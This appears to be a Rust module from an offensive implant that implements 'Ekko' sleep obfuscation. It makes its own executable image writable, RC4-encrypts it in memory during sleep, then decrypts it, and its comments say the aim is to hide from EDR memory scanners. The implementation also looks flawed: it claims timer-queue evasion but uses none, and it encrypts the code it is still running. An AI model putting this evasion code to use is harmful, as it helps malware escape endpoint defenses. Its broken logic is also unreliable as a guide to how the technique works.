#![allow(non_snake_case)]
#![allow(non_camel_case_types)]
#![allow(dead_code)]

//! # Sleep Obfuscation (Timer-Queue Evasion / Ekko)
//!
//! Encrypts the entire image in RAM when sleeping.
//! Memory scanners see only encrypted garbage.
//!
//! ## Flow
//! 1. `NtProtectVirtualMemory` - Change RX → RW
//! 2. `SystemFunction032` - RC4 encrypt image
//! 3. `NtWaitForSingleObject` - Sleep (encrypted state)
//! 4. `SystemFunction032` - RC4 decrypt image
//! 5. `NtProtectVirtualMemory` - Change RW → RX

use std::ffi::c_void;
use std::ptr;
use std::mem;
use log::{info, debug, error};

// ============================================================================
// USTRING for SystemFunction032
// ============================================================================

#[repr(C)]
pub struct USTRING {
    pub length: u32,
    pub maximum_length: u32,
    pub buffer: *mut c_void,
}

// ============================================================================
// API TYPES
// ============================================================================

type FnNtProtectVirtualMemory = unsafe extern "system" fn(
    process: isize, base: *mut *mut c_void, size: *mut usize, new: u32, old: *mut u32
) -> i32;
type FnSystemFunction032 = unsafe extern "system" fn(data: *mut USTRING, key: *mut USTRING) -> i32;
type FnNtWaitForSingleObject = unsafe extern "system" fn(handle: *mut c_void, alertable: i32, timeout: *mut i64) -> i32;
type FnNtCreateEvent = unsafe extern "system" fn(
    handle: *mut *mut c_void, access: u32, attr: *const c_void, event_type: i32, initial: i32
) -> i32;
type FnNtClose = unsafe extern "system" fn(handle: *mut c_void) -> i32;

const PAGE_READWRITE: u32 = 0x04;
const PAGE_EXECUTE_READ: u32 = 0x20;
const EVENT_ALL_ACCESS: u32 = 0x1F0003;

// ============================================================================
// GET CURRENT MODULE IMAGE BASE AND SIZE
// ============================================================================

/// Get the current executable's image base and size from PEB
unsafe fn get_current_image_info() -> Option<(*mut c_void, usize)> {
    #[cfg(target_arch = "x86_64")]
    {
        // PEB is at gs:[0x60]
        let peb: *const u8;
        std::arch::asm!("mov {}, gs:[0x60]", out(reg) peb, options(nostack, pure, readonly));
        
        // ImageBaseAddress is at PEB + 0x10
        let image_base = *(peb.add(0x10) as *const *mut c_void);
        
        // Parse PE header to get SizeOfImage
        let dos_header = image_base as *const u8;
        let e_lfanew = *((dos_header as usize + 0x3C) as *const i32);
        let nt_headers = (dos_header as usize + e_lfanew as usize) as *const u8;
        
        // SizeOfImage is at OptionalHeader + 0x38 (offset 0x50 from NT headers)
        let size_of_image = *((nt_headers as usize + 0x50) as *const u32) as usize;
        
        Some((image_base, size_of_image))
    }
    
    #[cfg(not(target_arch = "x86_64"))]
    {
        None
    }
}

// ============================================================================
// SLEEP OBFUSCATION (EKKO TECHNIQUE)
// ============================================================================

/// Obfuscated sleep - encrypts ACTUAL executable memory while sleeping
pub unsafe fn obfuscated_sleep(duration_ms: u32) -> Result<(), String> {
    info!("[Ekko] Starting obfuscated sleep: {}ms", duration_ms);

    // 1. Resolve APIs via GetProcAddress
    use windows_sys::Win32::System::LibraryLoader::GetModuleHandleA;
    use windows_sys::Win32::System::LibraryLoader::GetProcAddress;
    
    let ntdll = GetModuleHandleA(b"ntdll.dll\0".as_ptr());
    let advapi32 = GetModuleHandleA(b"advapi32.dll\0".as_ptr());
    
    if ntdll == 0 || advapi32 == 0 {
        return Err("[Ekko] Failed to get module handles".into());
    }

    let fn_protect: FnNtProtectVirtualMemory = mem::transmute(
        GetProcAddress(ntdll, b"NtProtectVirtualMemory\0".as_ptr())
    );
    let fn_wait: FnNtWaitForSingleObject = mem::transmute(
        GetProcAddress(ntdll, b"NtWaitForSingleObject\0".as_ptr())
    );
    let fn_create_event: FnNtCreateEvent = mem::transmute(
        GetProcAddress(ntdll, b"NtCreateEvent\0".as_ptr())
    );
    let fn_close: FnNtClose = mem::transmute(
        GetProcAddress(ntdll, b"NtClose\0".as_ptr())
    );
    let fn_rc4: FnSystemFunction032 = mem::transmute(
        GetProcAddress(advapi32, b"SystemFunction032\0".as_ptr())
    );

    // 2. Get ACTUAL current executable image base and size
    let (image_base, image_size) = get_current_image_info()
        .ok_or("[Ekko] Failed to get image info")?;
    
    info!("[Ekko] Image base: {:p}, size: 0x{:X}", image_base, image_size);

    let mut base = image_base;
    let mut size = image_size;

    // 3. Generate random RC4 key
    let seed = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap_or_default()
        .as_nanos() as u64;
    let mut key: [u8; 16] = [0; 16];
    for i in 0..16 {
        key[i] = ((seed.wrapping_mul((i as u64).wrapping_add(1))) >> ((i * 4) % 64)) as u8;
    }

    let mut key_ustr = USTRING {
        length: 16,
        maximum_length: 16,
        buffer: key.as_mut_ptr() as *mut c_void,
    };

    let mut data_ustr = USTRING {
        length: size as u32,
        maximum_length: size as u32,
        buffer: base,
    };

    // 4. Create event for timeout  
    let mut h_event: *mut c_void = ptr::null_mut();
    let status = fn_create_event(&mut h_event, EVENT_ALL_ACCESS, ptr::null(), 1, 0);
    if status != 0 {
        return Err(format!("[Ekko] NtCreateEvent failed: 0x{:X}", status));
    }

    // 5. Change protection: RX → RW (so we can encrypt)
    let mut old_protect: u32 = 0;
    let status = fn_protect(-1, &mut base, &mut size, PAGE_READWRITE, &mut old_protect);
    if status != 0 {
        fn_close(h_event);
        return Err(format!("[Ekko] NtProtect(RW) failed: 0x{:X}", status));
    }
    debug!("[Ekko] Protection changed: 0x{:X} → RW", old_protect);

    // 6. Encrypt entire image with RC4 (SystemFunction032)
    let status = fn_rc4(&mut data_ustr, &mut key_ustr);
    if status != 0 {
        // Restore protection before returning error
        fn_protect(-1, &mut base, &mut size, old_protect, &mut old_protect);
        fn_close(h_event);
        return Err(format!("[Ekko] RC4 encrypt failed: 0x{:X}", status));
    }
    info!("[Ekko] Image ENCRYPTED in RAM");

    // 7. Sleep (memory is encrypted garbage - EDR sees nothing!)
    let mut timeout = -((duration_ms as i64) * 10000); // 100ns units, negative = relative
    fn_wait(h_event, 0, &mut timeout);

    // 8. Decrypt with RC4 (symmetric - same operation decrypts)
    data_ustr.buffer = image_base;
    let status = fn_rc4(&mut data_ustr, &mut key_ustr);
    if status != 0 {
        error!("[Ekko] RC4 decrypt failed: 0x{:X} - CRITICAL!", status);
        // Can't recover from this - process will crash
    }
    debug!("[Ekko] Image DECRYPTED");

    // 9. Restore original protection (RW → RX)
    base = image_base;
    size = image_size;
    let status = fn_protect(-1, &mut base, &mut size, old_protect, &mut old_protect);
    if status != 0 {
        error!("[Ekko] NtProtect restore failed: 0x{:X}", status);
    }
    debug!("[Ekko] Protection restored");

    // 10. Cleanup
    fn_close(h_event);

    info!("[Ekko] Obfuscated sleep COMPLETE");
    Ok(())
}
